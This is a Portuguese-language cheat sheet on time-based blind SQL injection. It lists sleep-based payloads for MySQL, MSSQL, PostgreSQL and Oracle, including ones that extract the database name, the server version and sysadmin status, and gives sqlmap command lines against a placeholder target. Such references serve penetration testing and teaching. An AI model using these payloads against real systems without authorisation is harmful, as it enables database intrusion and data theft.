# Time-based Blind SQL Injection

## Como Funciona

Infere informações através de atrasos no tempo de resposta provocados por funções de sleep.

```sql
-- MySQL: SLEEP(N) causa atraso de N segundos
' AND SLEEP(5)--          → resposta demora 5s = TRUE
' AND IF(1=2, SLEEP(5), 0)-- → resposta imediata = FALSE
```

## Quando Usar

- Nenhuma diferença visível na resposta (mesma página para erro e sucesso)
- Outras técnicas bloqueadas ou falham
- Último recurso quando não há output ou diferença de resposta

## Funções por DBMS

| DBMS | Função de Delay |
|------|----------------|
| MySQL | `SLEEP(5)` |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| PostgreSQL | `pg_sleep(5)` |
| Oracle | `dbms_pipe.receive_message('a',5)` |
| SQLite | `randomblob(100000000)` (aproximado) |

## Detecção com SQLMap

```bash
sqlmap -u "http://alvo.com/?id=1" \
  --technique=T \
  --level=3 \
  --time-sec=5 \   # threshold de atraso (padrão: 5s)
  --batch
```

## Ajuste de Tempo

```bash
# Rede lenta: aumentar threshold
sqlmap -u "http://alvo.com/?id=1" \
  --technique=T \
  --time-sec=10 \
  --batch

# Servidor lento: ajustar timeout
sqlmap -u "http://alvo.com/?id=1" \
  --technique=T \
  --time-sec=8 \
  --timeout=60 \
  --batch
```

## Técnica Manual

```sql
-- MySQL: extrair primeiro char do banco
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

-- MSSQL: verificar se é DBA
'; IF (IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL: extrair versão
'; SELECT CASE WHEN (substring(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('x',5) ELSE 1 END FROM dual)--
```

## Limitações

- **Muito lento**: Cada bit requer uma requisição com atraso
- **Instável**: Latência de rede pode causar falsos positivos/negativos
- **Alto ruído**: Muitas requisições lentas → logs suspeitos

## Otimizações

```bash
# Reduzir threads (evitar timeout acumulado)
sqlmap -u "http://alvo.com/?id=1" \
  --technique=T \
  --threads=1 \
  --time-sec=5 \
  --batch

# Usar com Boolean quando possível (T é fallback)
sqlmap -u "http://alvo.com/?id=1" \
  --technique=BT \
  --time-sec=5 \
  --batch
```

## Indicadores de Sucesso

```
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

## Notas de Segurança

- SLEEP() em produção pode impactar performance do servidor
- Use `--risk=1` para evitar SLEEP em queries UPDATE/DELETE
- Considere horários de baixo tráfego para scans time-based
